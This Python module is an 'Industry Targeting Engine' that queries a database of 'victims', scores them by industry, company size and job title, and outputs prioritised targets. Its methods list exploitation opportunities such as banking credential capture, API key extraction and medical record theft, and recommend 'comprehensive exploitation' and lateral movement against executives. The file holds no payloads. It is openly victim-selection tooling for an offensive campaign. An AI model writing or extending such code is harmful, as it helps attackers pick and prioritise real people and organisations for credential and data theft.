"""
Industry Targeting Engine
Targeting victims based on industry and company information
"""

import os
import json
from datetime import datetime, timezone
from typing import Dict, List, Any, Optional
import logging
from dataclasses import dataclass

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@dataclass
class IndustryTarget:
    """Industry targeting criteria"""
    industries: List[str]
    exclude_industries: List[str]
    company_sizes: List[str]
    job_titles: List[str]
    exclude_job_titles: List[str]
    seniority_levels: List[str]
    departments: List[str]

class IndustryTargetingEngine:
    """Industry-based targeting engine for campaigns"""
    
    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client
        
        # Industry classifications
        self.industries = {
            "technology": {
                "keywords": ["tech", "software", "ai", "cloud", "data", "cyber", "security", "startup", "innovation", "digital"],
                "high_value": True,
                "risk_level": "high"
            },
            "financial": {
                "keywords": ["bank", "finance", "investment", "credit", "loan", "insurance", "trading", "wealth", "fintech"],
                "high_value": True,
                "risk_level": "critical"
            },
            "healthcare": {
                "keywords": ["health", "medical", "pharma", "hospital", "clinic", "biotech", "wellness"],
                "high_value": True,
                "risk_level": "high"
            },
            "retail": {
                "keywords": ["retail", "ecommerce", "shop", "store", "marketplace", "commerce", "sales"],
                "high_value": False,
                "risk_level": "medium"
            },
            "manufacturing": {
                "keywords": ["manufacturing", "factory", "production", "industrial", "automotive", "aerospace"],
                "high_value": False,
                "risk_level": "medium"
            },
            "education": {
                "keywords": ["education", "university", "school", "college", "academy", "learning", "training"],
                "high_value": False,
                "risk_level": "low"
            },
            "government": {
                "keywords": ["government", "gov", "public", "municipal", "federal", "state", "agency"],
                "high_value": True,
                "risk_level": "critical"
            },
            "consulting": {
                "keywords": ["consulting", "advisory", "strategy", "management", "professional", "services"],
                "high_value": True,
                "risk_level": "high"
            }
        }
        
        self.job_titles = {
            "executive": ["ceo", "cfo", "cto", "coo", "president", "vp", "vice president", "director", "managing director"],
            "senior_management": ["senior manager", "head of", "lead", "principal", "senior director"],
            "middle_management": ["manager", "supervisor", "team lead", "coordinator"],
            "technical": ["engineer", "developer", "architect", "analyst", "specialist", "consultant"],
            "financial": ["accountant", "financial analyst", "treasurer", "controller", "auditor"],
            "it_admin": ["admin", "administrator", "sysadmin", "network admin", "security admin"],
            "hr": ["hr", "human resources", "recruiter", "talent acquisition"],
            "sales": ["sales", "account manager", "business development", "marketing"]
        }
        
        self.company_sizes = {
            "startup": {"employees": "1-50", "revenue": "<$10M", "risk_level": "medium"},
            "small": {"employees": "51-200", "revenue": "$10M-$50M", "risk_level": "medium"},
            "medium": {"employees": "201-1000", "revenue": "$50M-$500M", "risk_level": "high"},
            "large": {"employees": "1001-5000", "revenue": "$500M-$5B", "risk_level": "high"},
            "enterprise": {"employees": "5000+", "revenue": "$5B+", "risk_level": "critical"}
        }
    
    def initialize_targeting(self, targeting_config: Any) -> bool:
        """Initialize industry targeting"""
        try:
            self.target_config = targeting_config
            logger.info("Industry targeting initialized")
            return True
            
        except Exception as e:
            logger.error(f"Error initializing industry targeting: {e}")
            return False
    
    def get_target_victims(self, limit: int = 1000) -> List[Dict[str, Any]]:
        """Get victims matching industry criteria"""
        try:
            if not self.mongodb:
                return []
            
            collection = self.mongodb.victims
            query = {}
            
            # Build industry query based on business intelligence data
            if self.target_config.industries:
                industry_query = []
                for industry in self.target_config.industries:
                    industry_info = self.industries.get(industry, {})
                    keywords = industry_info.get("keywords", [])
                    
                    for keyword in keywords:
                        industry_query.append({
                            "$or": [
                                {"business_intelligence.industry": {"$regex": keyword, "$options": "i"}},
                                {"business_intelligence.company_name": {"$regex": keyword, "$options": "i"}},
                                {"business_intelligence.domain": {"$regex": keyword, "$options": "i"}}
                            ]
                        })
                
                if industry_query:
                    query["$or"] = industry_query
            
            # Filter by company size
            if self.target_config.company_sizes:
                size_query = []
                for size in self.target_config.company_sizes:
                    size_info = self.company_sizes.get(size, {})
                    employee_range = size_info.get("employees", "")
                    
                    if "-" in employee_range:
                        min_emp, max_emp = employee_range.split("-")
                        size_query.append({
                            "business_intelligence.employee_count": {
                                "$gte": int(min_emp),
                                "$lte": int(max_emp)
                            }
                        })
                
                if size_query:
                    query["$or"] = query.get("$or", []) + size_query
            
            # Filter by job titles
            if self.target_config.job_titles:
                title_query = []
                for title in self.target_config.job_titles:
                    title_query.append({
                        "business_intelligence.job_title": {"$regex": title, "$options": "i"}
                    })
                
                if title_query:
                    query["$or"] = query.get("$or", []) + title_query
            
            # Exclude criteria
            if self.target_config.exclude_industries:
                exclude_query = []
                for industry in self.target_config.exclude_industries:
                    industry_info = self.industries.get(industry, {})
                    keywords = industry_info.get("keywords", [])
                    
                    for keyword in keywords:
                        exclude_query.append({
                            "$and": [
                                {"business_intelligence.industry": {"$not": {"$regex": keyword, "$options": "i"}}},
                                {"business_intelligence.company_name": {"$not": {"$regex": keyword, "$options": "i"}}}
                            ]
                        })
                
                if exclude_query:
                    query["$and"] = exclude_query
            
            # Execute query
            cursor = collection.find(query).limit(limit)
            victims = list(cursor)
            
            logger.info(f"Found {len(victims)} victims matching industry criteria")
            return victims
            
        except Exception as e:
            logger.error(f"Error getting industry targets: {e}")
            return []
    
    def analyze_industry_distribution(self, victims: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Analyze industry distribution of victims"""
        try:
            distribution = {
                "by_industry": {},
                "by_company_size": {},
                "by_job_title": {},
                "by_risk_level": {
                    "critical": 0,
                    "high": 0,
                    "medium": 0,
                    "low": 0
                },
                "total_victims": len(victims)
            }
            
            for victim in victims:
                business_intel = victim.get("business_intelligence", {})
                
                # Analyze by industry
                industry = business_intel.get("industry", "Unknown")
                distribution["by_industry"][industry] = distribution["by_industry"].get(industry, 0) + 1
                
                # Analyze by company size
                company_size = self._determine_company_size(business_intel)
                distribution["by_company_size"][company_size] = distribution["by_company_size"].get(company_size, 0) + 1
                
                # Analyze by job title
                job_title = business_intel.get("job_title", "Unknown")
                title_category = self._categorize_job_title(job_title)
                distribution["by_job_title"][title_category] = distribution["by_job_title"].get(title_category, 0) + 1
                
                # Analyze by risk level
                risk_level = self._calculate_risk_level(business_intel)
                distribution["by_risk_level"][risk_level] += 1
            
            return distribution
            
        except Exception as e:
            logger.error(f"Error analyzing industry distribution: {e}")
            return {}
    
    def _determine_company_size(self, business_intel: Dict[str, Any]) -> str:
        """Determine company size from business intelligence"""
        employee_count = business_intel.get("employee_count", 0)
        
        if employee_count <= 50:
            return "startup"
        elif employee_count <= 200:
            return "small"
        elif employee_count <= 1000:
            return "medium"
        elif employee_count <= 5000:
            return "large"
        else:
            return "enterprise"
    
    def _categorize_job_title(self, job_title: str) -> str:
        """Categorize job title"""
        title_lower = job_title.lower()
        
        for category, titles in self.job_titles.items():
            if any(title in title_lower for title in titles):
                return category
        
        return "other"
    
    def _calculate_risk_level(self, business_intel: Dict[str, Any]) -> str:
        """Calculate risk level based on business intelligence"""
        industry = business_intel.get("industry", "").lower()
        job_title = business_intel.get("job_title", "").lower()
        company_size = self._determine_company_size(business_intel)
        
        risk_score = 0
        
        # Industry risk
        for ind_name, ind_info in self.industries.items():
            if any(keyword in industry for keyword in ind_info["keywords"]):
                if ind_info["risk_level"] == "critical":
                    risk_score += 4
                elif ind_info["risk_level"] == "high":
                    risk_score += 3
                elif ind_info["risk_level"] == "medium":
                    risk_score += 2
                else:
                    risk_score += 1
                break
        
        # Job title risk
        if any(title in job_title for title in self.job_titles["executive"]):
            risk_score += 3
        elif any(title in job_title for title in self.job_titles["it_admin"]):
            risk_score += 2
        elif any(title in job_title for title in self.job_titles["financial"]):
            risk_score += 2
        
        # Company size risk
        size_risk = {
            "startup": 1,
            "small": 2,
            "medium": 3,
            "large": 4,
            "enterprise": 5
        }
        risk_score += size_risk.get(company_size, 1)
        
        # Determine risk level
        if risk_score >= 8:
            return "critical"
        elif risk_score >= 6:
            return "high"
        elif risk_score >= 4:
            return "medium"
        else:
            return "low"
    
    def get_industry_intelligence(self, industry: str) -> Dict[str, Any]:
        """Get intelligence about an industry"""
        try:
            industry_info = self.industries.get(industry, {})
            
            intelligence = {
                "industry": industry,
                "keywords": industry_info.get("keywords", []),
                "high_value": industry_info.get("high_value", False),
                "risk_level": industry_info.get("risk_level", "medium"),
                "targeting_recommendations": [],
                "exploitation_opportunities": []
            }
            
            # Add targeting recommendations
            if industry_info.get("high_value"):
                intelligence["targeting_recommendations"].append({
                    "type": "priority_targeting",
                    "description": f"High-value industry with {industry_info['risk_level']} risk level",
                    "action": "Prioritize for comprehensive exploitation"
                })
            
            # Add exploitation opportunities
            if industry == "financial":
                intelligence["exploitation_opportunities"].extend([
                    "Financial data extraction",
                    "Banking credential capture",
                    "Investment portfolio access",
                    "Payment system exploitation"
                ])
            elif industry == "technology":
                intelligence["exploitation_opportunities"].extend([
                    "Source code access",
                    "API key extraction",
                    "Infrastructure mapping",
                    "Security vulnerability exploitation"
                ])
            elif industry == "healthcare":
                intelligence["exploitation_opportunities"].extend([
                    "Patient data access",
                    "Medical record extraction",
                    "Insurance information",
                    "Regulatory compliance data"
                ])
            
            return intelligence
            
        except Exception as e:
            logger.error(f"Error getting industry intelligence: {e}")
            return {}
    
    def get_targeting_recommendations(self, victims: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Get targeting recommendations based on victim analysis"""
        try:
            recommendations = []
            
            # Analyze industry distribution
            distribution = self.analyze_industry_distribution(victims)
            
            # High-risk industry recommendation
            critical_count = distribution["by_risk_level"]["critical"]
            if critical_count > 0:
                recommendations.append({
                    "type": "critical_risk_targets",
                    "priority": "critical",
                    "description": f"Found {critical_count} critical risk targets",
                    "action": "Immediate comprehensive exploitation recommended",
                    "potential_value": critical_count * 200
                })
            
            # Executive targeting recommendation
            executive_count = distribution["by_job_title"].get("executive", 0)
            if executive_count > 0:
                recommendations.append({
                    "type": "executive_targets",
                    "priority": "high",
                    "description": f"Found {executive_count} executive-level targets",
                    "action": "Target for high-value data and lateral movement",
                    "potential_value": executive_count * 150
                })
            
            # Enterprise targeting recommendation
            enterprise_count = distribution["by_company_size"].get("enterprise", 0)
            if enterprise_count > 0:
                recommendations.append({
                    "type": "enterprise_targets",
                    "priority": "high",
                    "description": f"Found {enterprise_count} enterprise targets",
                    "action": "Focus on organizational intelligence gathering",
                    "potential_value": enterprise_count * 120
                })
            
            return recommendations
            
        except Exception as e:
            logger.error(f"Error getting targeting recommendations: {e}")
            return []
